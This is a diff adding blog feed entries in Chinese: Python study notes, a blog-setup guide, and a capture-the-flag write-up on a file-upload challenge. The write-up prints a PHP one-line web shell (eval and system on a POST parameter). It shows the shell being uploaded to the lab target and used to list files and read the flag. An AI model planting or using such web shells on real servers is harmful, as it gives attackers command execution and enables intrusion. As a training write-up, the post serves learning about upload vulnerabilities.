+    <link href="https://axingde.github.io/2020/10/12/python%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
+    <id>https://axingde.github.io/2020/10/12/python学习笔记/</id>
+    <published>2020-10-12T07:45:06.000Z</published>
+    <updated>2020-10-12T08:22:35.646Z</updated>
+    
+    <content type="html"><![CDATA[<p>python编辑中很多地方都可以用到while true，比如用户登录，while true是一个无限循环，只有在循环内适用break才能跳出循环。</p><p>我使用编写了一个登录判断</p><pre class="line-numbers language-none"><code class="language-none"># -*- coding: utf-8 -*- d &#x3D; &#123;&#39;admin&#39;: &#39;admin&#39;, &#39;test&#39;: &#39;test&#39;, &#39;xss&#39;: &#39;123456&#39;&#125;count&#x3D;5while True:    name &#x3D; raw_input(&#39;请输入账户用户名:&#39;)    if name in d:        break    else:        print (&#39;用户名不正确，请重新输入&#39;)while count:    password &#x3D; raw_input(&#39;请输入密码：&#39;)    if d[name] &#x3D;&#x3D; password:        print (&#39;密码正确&#39;)        break    else:        count -&#x3D; 1        print (&#39;输入密码错误你还有&#123;&#125;次输入机会&#39;.format(count))<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">1.# -*- coding: utf-8 -*-  <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>​    python文件当中是不支持中文的，即使你输入的注释是中文也不行，如果不输入而代码中有中文就会有下面的报错：</p><pre class="line-numbers language-none"><code class="language-none">SyntaxError: Non-ASCII character &#39;\xe8&#39; in file<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>为了解决这个问题，就需要把文件编码类型改为UTF-8的类型，输入这个代码就可以让PY源文件里面有中文了。</p><ol start="2"><li><p>raw_input() 获得是一个字符串（string）类型的变量而</p><p>input() 获得的是一个数值类型的变量</p><p>如果利用不规范，在上面代码中密码比较时使用input()会报下面的错:   </p></li></ol><pre class="line-numbers language-none"><code class="language-none">File &quot;&lt;string&gt;&quot;, line 1, in &lt;module&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ol start="3"><li><p>format()函数用法</p><p>Python2.6 开始，新增了一种格式化字符串的函数 str.format()，它增强了字符串格式化的功能。</p><p>基本语法是通过 {} 和 : 来代替以前的 % 。</p><p>format 函数可以接受不限个参数，位置可以不按顺序。</p><p>实列：</p><pre class="line-numbers language-none"><code class="language-none">print (&quot;&#123;&#125; &#123;&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;))hello worldprint (&quot;&#123;0&#125; &#123;1&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;))hello worldprint (&quot;&#123;1&#125; &#123;0&#125;&quot;.format(&quot;hello&quot;, &quot;world&quot;)) world hello<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;python编辑中很多地方都可以用到while true，比如用户登录，while true是一个无限循环，只有在循环内适用break才能跳出循环。&lt;/p&gt;
+&lt;p&gt;我使用编写了一个登录判断&lt;/p&gt;
+&lt;pre class=&quot;line-numbers language-none
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://axingde.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="python" scheme="https://axingde.github.io/tags/python/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>BUU upload course</title>
+    <link href="https://axingde.github.io/2020/10/10/buu/"/>
+    <id>https://axingde.github.io/2020/10/10/buu/</id>
+    <published>2020-10-10T09:23:28.000Z</published>
+    <updated>2020-10-10T10:18:20.209Z</updated>
+    
+    <content type="html"><![CDATA[<p>1.php 一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval($_POST[&quot;m&quot;]);?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>当这条语句被服务端执行了，我们同时利用 POST 请求上传变量 x 的值，例如 x=echo ‘Hello’，php 解析器执行的实质上是 @eval(“echo ‘Hello’”)，即在前端输出一个字符串，更常见的利用手法是利用 @eval(system($_POST[“x”])) 直接控制服务端的 shell</p><p><img src="https://i.loli.net/2020/10/10/D3Sc9R51V6CXAM2.png" alt="image-20201010174655274"></p><p>同时提交 m=ls ，便可以通过 shell 输出当前网页目录下的其他文件，注入其他命令同理</p><p>2.题目操作</p><p>用浏览器连接靶机，有一个可以提交文件的页面，随便 sumbit 一个文本文件</p><p><img src="https://i.loli.net/2020/10/10/SHwPNF7VAY2LpCW.png" alt="image-20201010174908217"></p><p>提示：文件已储存在: uploads/xxx.jpg</p><p>可以在 ?file=uploads/xxx.jpg 查看，有相应的内容回显</p><p>这是一个最普通的 php 脚本，保存改后缀为 .php 尝试上传</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php phpinfo(); ?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在访问时回显 Hello Worl! 说明自定义的 php 脚本被成功执行</p><p>把脚本修改成一句话木马</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php @eval(system($_POST[&quot;m&quot;]));?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功上传后，访问相应的 ?file=uploads/xxx.jpg，页面空白，说明 php 命令被成功执行</p><p>将 url 复制到 Postman ，编辑 Body（Post 的表单）为 m:ls</p><p><img src="https://i.loli.net/2020/10/10/GkvQN9MwLpD5OtT.png" alt="image-20201010175358320"></p><p>成功拿到 shell，接下来找到 flag 所在的目录就好了，使用m:find -name / ‘flag’ </p><p>然后使用cat 查看内容</p><p><img src="https://i.loli.net/2020/10/10/WlZCXqAQt7OM2Bh.png" alt="image-20201010175515472"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;1.php 一句话木马&lt;/p&gt;
+&lt;pre class=&quot;line-numbers language-none&quot;&gt;&lt;code class=&quot;language-none&quot;&gt;&amp;lt;?php @eval($_POST[&amp;quot;m&amp;quot;]);?&amp;gt;&lt;span aria
+      
+    
+    </summary>
+    
+      <category term="渗透/web/upload" scheme="https://axingde.github.io/categories/%E6%B8%97%E9%80%8F-web-upload/"/>
+    
+    
+      <category term="BUU" scheme="https://axingde.github.io/tags/BUU/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>github</title>
+    <link href="https://axingde.github.io/2020/09/27/github/"/>
+    <id>https://axingde.github.io/2020/09/27/github/</id>
+    <published>2020-09-27T15:57:32.000Z</published>
+    <updated>2020-09-28T07:52:41.436Z</updated>
+    
+    <content type="html"><![CDATA[<p>这是我在github的第一篇文章，也是主要描述我搭建此博客的过程，由于搭建此博客也是参考别的师傅们的文章，所以本笔记主要把我搭建所参考的文章连接放在此笔记中：</p><p><a href="https://hujichn.github.io/2016/04/06/Win10%E4%B8%8A%E5%88%A9%E7%94%A8github+hexo%E5%BB%BA%E7%AB%8B%E5%8D%9A%E5%AE%A2%E7%9A%84%E6%96%B9%E6%B3%95/">主要参考文章</a></p><p><a href="https://github.com/blinkfox/hexo-theme-matery/blob/develop/README_CN.md">主题修改文章</a></p><p><a href="https://blog.csdn.net/zemprogram/article/details/104288872">个人博客搭建笔记—-hexo根目录下的_config.yml配置解释</a></p><p><a href="https://www.cnblogs.com/xueweisuoyong/p/11914045.html">git安装</a></p><p><a href="https://blog.csdn.net/weixin_33857230/article/details/91474562">Hexo 添加分类及标签</a></p><p>本文中所需要下载的软件：</p><p><a href="https://nodejs.org/en/">Node.js</a></p><p><a href="https://gitforwindows.org/">git for windows</a></p><p><a href="https://github.com/blinkfox/hexo-theme-matery">hexo-theme-matery主题</a></p><p>删除文章：</p><p>删除文章的过程一样也很简单，先删除本地文件，然后通过生成和部署命令进而将远程仓库中的文件也一并删除。<br>具体来说，以最开始默认形成的helloworld.md这篇文章为例。<br>首先进入到source / _post 文件夹中，找到helloworld.md文件，在本地直接执行删除。然后依次执行</p><p>hexo d -g</p><p><strong>我使用过程中遇到的问题:</strong></p><p>1.在git bash命令界面中输入hexo d -g之后出现：</p><p>Username for ‘<a href="https://github.com&#39;">https://github.com&#39;</a>:  ；</p><p>解决：在弹出框中输入的是github上的邮箱账号, 而不是github中设置的username, 这是个巨坑!</p><p>Password for ‘https://你的github邮箱@github.com’:</p><p>解决：在弹出框中输入github的登录密码,点击enter键即可. </p><p>2.github pages（你的博客地址）无法访问：</p><p>解决方法：</p><p>打开控制面板-网络和internet - 网络和共享中心 （选择你的网络进入）- 属性-IPv4-使用下面的DNS服务器地址-修改为114.114.114.114</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;这是我在github的第一篇文章，也是主要描述我搭建此博客的过程，由于搭建此博客也是参考别的师傅们的文章，所以本笔记主要把我搭建所参考的文章连接放在此笔记中：&lt;/p&gt;
+&lt;p&gt;&lt;a href=&quot;https://hujichn.github.io/2016/04/06/Win1
+      
+    
+    </summary>
+    
+      <category term="笔记" scheme="https://axingde.github.io/categories/%E7%AC%94%E8%AE%B0/"/>
+    
+    
+      <category term="github" scheme="https://axingde.github.io/tags/github/"/>
+    
+  </entry>
+  
 </feed>
